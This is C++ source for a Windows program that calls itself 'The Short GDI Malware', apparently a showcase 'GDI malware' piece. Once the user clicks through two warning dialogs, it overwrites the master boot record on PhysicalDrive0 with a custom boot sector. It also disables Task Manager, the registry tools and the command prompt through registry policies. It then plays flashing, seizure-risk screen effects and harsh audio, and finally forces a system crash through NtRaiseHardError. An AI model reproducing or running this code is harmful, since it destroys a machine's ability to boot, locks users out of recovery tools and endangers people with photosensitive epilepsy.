// Anthropomorphic.cpp : The Short GDI Malware
//

#include <windows.h>
#include <tchar.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
//#include "bootrec.h" // Replaced with the ASM MBR
#define M_PI   3.14159265358979323846264338327950288
//#define PI   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}

const unsigned char MasterBootRecord[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBE, 0xC1, 0x7D,
0xBF, 0x20, 0x14, 0x2E, 0xAD, 0x91, 0xBB, 0xF0, 0x00, 0xD1, 0xE1, 0xB8, 0x18, 0x37, 0x73, 0x03,
0xB8, 0x38, 0x02, 0xE8, 0x22, 0x00, 0x01, 0xDF, 0x83, 0xEB, 0x10, 0x72, 0x4F, 0xE8, 0x18, 0x00,
0x29, 0xDF, 0x83, 0xEF, 0x08, 0xEB, 0xE2, 0xAD, 0x97, 0xAD, 0x84, 0xE4, 0x93, 0xB0, 0x30, 0x50,
0xC6, 0x44, 0xFF, 0x02, 0xE8, 0xAE, 0x00, 0x58, 0x50, 0x53, 0x51, 0x57, 0x50, 0xBB, 0x79, 0x7D,
0x2E, 0xD7, 0x93, 0xB9, 0x08, 0x00, 0x88, 0xF8, 0xD0, 0xE3, 0x72, 0x02, 0x31, 0xC0, 0x80, 0xFF,
0x10, 0x72, 0x07, 0x80, 0x3D, 0x0E, 0x74, 0x98, 0x32, 0x05, 0xAA, 0xE2, 0xE9, 0x81, 0xC7, 0x38,
0x01, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xD5, 0x5F, 0x59, 0x5B, 0x58, 0xC3, 0x81, 0xC7, 0x88, 0x09,
0x81, 0xFE, 0xEB, 0x7D, 0x75, 0x8D, 0xB1, 0x05, 0xB8, 0x02, 0x00, 0x2E, 0xA5, 0xAB, 0xE2, 0xFB,
0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x04, 0xFA, 0x74, 0xF6, 0x89, 0x16, 0x04, 0xFA, 0xB4, 0x01,
0xCD, 0x16, 0xB4, 0x00, 0x74, 0x02, 0xCD, 0x16, 0x88, 0xE0, 0x3C, 0x01, 0x75, 0x02, 0xCD, 0x20,
0x2C, 0x48, 0x72, 0x0C, 0x3C, 0x09, 0x73, 0x08, 0xBB, 0xF5, 0x7D, 0x2E, 0xD7, 0xA2, 0xFE, 0xF9,
0xBE, 0x20, 0xE6, 0xAD, 0x97, 0xAD, 0x93, 0x31, 0xC0, 0xE8, 0x2B, 0x00, 0x80, 0x36, 0xFF, 0xF9,
0x80, 0xB8, 0x28, 0x0E, 0x78, 0x07, 0xA0, 0x22, 0xE6, 0xB1, 0x03, 0xD2, 0xE0, 0xE8, 0x68, 0xFF,
0xBD, 0x37, 0x7C, 0xB7, 0x21, 0xFF, 0xD5, 0xB7, 0x2E, 0xFF, 0xD5, 0xB7, 0x28, 0xFF, 0xD5, 0xB7,
0x34, 0xFF, 0xD5, 0xEB, 0x9B, 0x74, 0x03, 0xE8, 0x4E, 0xFF, 0x89, 0xF8, 0x31, 0xD2, 0xB9, 0x40,
0x01, 0xF7, 0xF1, 0x88, 0xD4, 0x08, 0xC4, 0x80, 0xE4, 0x07, 0x75, 0x5A, 0xB5, 0x37, 0x38, 0x6D,
0xFF, 0x10, 0xE4, 0x38, 0xAD, 0x00, 0x0A, 0x10, 0xE4, 0x38, 0x6D, 0x08, 0x10, 0xE4, 0x38, 0xAD,
0xC0, 0xFE, 0x10, 0xE4, 0x84, 0xFF, 0x74, 0x2B, 0xF6, 0xC3, 0x05, 0x74, 0x0C, 0x3B, 0x16, 0x00,
0xFA, 0xB0, 0x02, 0x72, 0x0C, 0xB0, 0x08, 0xEB, 0x08, 0x3C, 0x00, 0xB0, 0x04, 0x72, 0x02, 0xB0,
0x01, 0x84, 0xC4, 0x75, 0x23, 0x88, 0xD8, 0x84, 0xC4, 0x75, 0x1D, 0xD0, 0xE8, 0x75, 0xF8, 0xB0,
0x08, 0xEB, 0xF4, 0x89, 0x16, 0x00, 0xFA, 0x2E, 0xA2, 0x3A, 0x7D, 0xA0, 0xFE, 0xF9, 0x84, 0xC4,
0x75, 0x06, 0x20, 0xDC, 0x74, 0x1A, 0x88, 0xD8, 0x88, 0x44, 0xFE, 0xA8, 0x05, 0xBB, 0x80, 0xFD,
0x75, 0x03, 0xBB, 0x02, 0x00, 0xA8, 0x0C, 0x74, 0x02, 0xF7, 0xDB, 0x01, 0xDF, 0x89, 0x7C, 0xFC,
0xC3, 0x00, 0x42, 0xE7, 0xE7, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xFC, 0xF0, 0xF0, 0xFC, 0x7E,
0x3C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x7E, 0xFF, 0xFF, 0xE7, 0xE7, 0x42,
0x00, 0x3C, 0x7E, 0xFF, 0xFF, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xDB, 0xDB, 0xFF, 0xFF, 0xFF,
0xA5, 0x00, 0x00, 0x00, 0x18, 0x18, 0x00, 0x00, 0x00, 0x3C, 0x7E, 0x3F, 0x0F, 0x0F, 0x3F, 0x7E,
0x3C, 0x00, 0x00, 0xFE, 0x7F, 0x02, 0x42, 0x02, 0x42, 0xFF, 0x7F, 0x40, 0x42, 0x7E, 0x7E, 0x02,
0x02, 0x7F, 0x02, 0xC0, 0x03, 0x40, 0x02, 0x7F, 0x02, 0x40, 0x02, 0xFE, 0x7F, 0x02, 0x42, 0xFF,
0x7B, 0x40, 0x0A, 0x7E, 0x7E, 0x02, 0x40, 0xFF, 0x7F, 0x00, 0x00, 0x98, 0xAA, 0x90, 0x50, 0x98,
0x64, 0xA0, 0x3C, 0xA8, 0x50, 0x01, 0x00, 0x00, 0x08, 0x00, 0x02, 0x00, 0x00, 0x04, 0x55, 0xAA
};

DWORD WINAPI MBRWiper(LPVOID lpParam)
{
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);
	WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
	CloseHandle(hDevice);
}

COLORREF TripleRGB() {
	int clr = rand() % 4;
	if (clr == 0) return RGB(110, 0, 0); if (clr == 1) return RGB(0, 110, 0); if (clr == 2) return RGB(20, 10, 255); if (clr == 3) return RGB(1, 20, 30); if (clr == 4) return RGB(255, 255, 0);
}
DWORD WINAPI shader1(LPVOID lpParam)
{
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += (x * y + x & i);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
DWORD WINAPI balls(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	int x = 10;
	int y = 10;
	while (1) {
		HDC hdc = GetDC(0);
		int top_x = 0 + x;
		int top_y = 0 + y;
		int bottom_x = 100 + x;
		int bottom_y = 100 + y;
		x += incrementor * signX;
		y += incrementor * signY;
		HBRUSH brush = CreateSolidBrush(TripleRGB());
		SelectObject(hdc, brush);
		Ellipse(hdc, top_x, top_y, bottom_x, bottom_y);
		if (y >= GetSystemMetrics(SM_CYSCREEN))
		{
			signY = -1;
		}

		if (x >= GetSystemMetrics(SM_CXSCREEN))
		{
			signX = -1;
		}

		if (y == 0)
		{
			signY = 1;
		}

		if (x == 0)
		{
			signX = 1;
		}
		Sleep(10);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI shaker(LPVOID lpParam)
{
	HDC hdc;
	int sw, sh;
	double angle = 0.0;
	int xadd, yadd;
	while (1) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		xadd = cos(angle) * 10, yadd = sin(angle) * 10;
		BitBlt(hdc, xadd, yadd, sw, sh, hdc, 0, 0, 0x1900ac010e);
		angle += M_PI / 8;
		DeleteObject(brush);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}
DWORD WINAPI shader2(LPVOID lpParam) //credits to N17Pro3426
{
	HDC hdc = GetDC(NULL);
	HDC hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0);
	int h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	INT i = 0;
	while (1)
	{
		hdc = GetDC(NULL);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i ^ 4) * sin(60));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = (FLOAT)fmod((DOUBLE)hslcolor.h + (DOUBLE)(x + y) / 100000.0 + 0.05, 1.0);
				hslcolor.s = 1.f;
				if (hslcolor.l < .2f)
				{
					hslcolor.l += .2f;
				}
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		DeleteDC(hdc);
	}
	return 0x00;
}
DWORD WINAPI triangle(LPVOID pvoid)
{
	HDC hdc = GetDC(0);
	while (1) {
		hdc = GetDC(0);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
		TRIVERTEX vtx[3];
		vtx[0].x = rand() % w; vtx[0].y = rand() % h;
		vtx[1].x = rand() % w; vtx[1].y = rand() % h;
		vtx[2].x = rand() % w; vtx[2].y = rand() % h;
		vtx[0].Red = 0x7F80; vtx[0].Green = 0x0000; vtx[0].Blue = 0x0000; vtx[0].Alpha = 0x0000;
		vtx[1].Red = 0xCFF0; vtx[1].Green = 0x0000; vtx[1].Blue = 0xCFF0; vtx[1].Alpha = 0x0000;
		vtx[2].Red = 0x0000; vtx[2].Green = 0x0000; vtx[2].Blue = 0xFFFF; vtx[2].Alpha = 0x0000;
		GRADIENT_TRIANGLE gt;
		gt.Vertex1 = 0;
		gt.Vertex2 = 1; gt.Vertex3 = 2;
		GradientFill(hdc, vtx, 4, &gt, 1, GRADIENT_FILL_TRIANGLE);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI textout1(LPVOID lpvd)
{
	int x = GetSystemMetrics(0); int y = GetSystemMetrics(1);
	LPCSTR text1 = 0;
	//LPCSTR text2 = 0;
	while (1)
	{
		HDC hdc = GetDC(0);
		SetBkMode(hdc, 0);
		text1 = "12345678910";
		//text2 = "you asked for it";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		HFONT font = CreateFontA(43, 32, 0, 0, FW_EXTRALIGHT, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Comic Sans MS");
		SelectObject(hdc, font);
		TextOutA(hdc, rand() % x, rand() % y, text1, strlen(text1));
		//TextOutA(hdc, rand() % x, rand() % y, text2, strlen(text2));
		DeleteObject(font);
		ReleaseDC(0, hdc);
		Sleep(100);
	}
}
DWORD WINAPI swirl(LPVOID lpParam) {
	HDC hdc = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < sh * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++) {
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, SRCAND);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCAND);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
		Sleep(1);
	}
}
VOID WINAPI sound1() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 30] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t >> 4 | (t >> 12) + (222 & t * (1 + (7685152 >> (t >> 12) & 15) / 8)));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 60] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 3 | t >> 4));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[32000 * 6] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * (t >> 8 | t >> 9));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}

void reg_add(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;
	result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
	RegCloseKey(hKey);
	return;
}

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine, int       nCmdShow
)
{
	if (MessageBoxW(NULL, L"This is a Malware,\nClick yes to run.\nClick no to exit.", L"Anthropomorphic.exe by Venra and N17Pro3426", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
	{
		ExitProcess(0);
	}
	else
	{
		if (MessageBoxW(NULL, L"Are you sure? It will overwrite the boot record and it contains flashing lights - NOT for epilepsy", L"F?i?n?a?l? ?W?a?r?n?i?n?g? - Anthropomorphic.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
		{
			ExitProcess(0);
		}
		else
		{
			CreateThread(0, 0, MBRWiper, 0, 0, 0);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(2000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			HANDLE thread1dot1 = CreateThread(0, 0, balls, 0, 0, 0);
			sound1();
			Sleep(30000);
			TerminateThread(thread1, 0);
			CloseHandle(thread1);
			TerminateThread(thread1dot1, 0);
			CloseHandle(thread1dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread2 = CreateThread(0, 0, shaker, 0, 0, 0);
			HANDLE thread2dot1 = CreateThread(0, 0, shader2, 0, 0, 0);
			sound2();
			Sleep(30000);
			TerminateThread(thread2, 0);
			CloseHandle(thread2);
			InvalidateRect(0, 0, 0);
			HANDLE thread3 = CreateThread(0, 0, triangle, 0, 0, 0);
			Sleep(30000);
			TerminateThread(thread2dot1, 0);
			CloseHandle(thread2dot1);
			InvalidateRect(0, 0, 0);
			HANDLE thread4 = CreateThread(0, 0, swirl, 0, 0, 0);
			HANDLE thread4dot1 = CreateThread(0, 0, textout1, 0, 0, 0);
			sound3();
			Sleep(6000);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
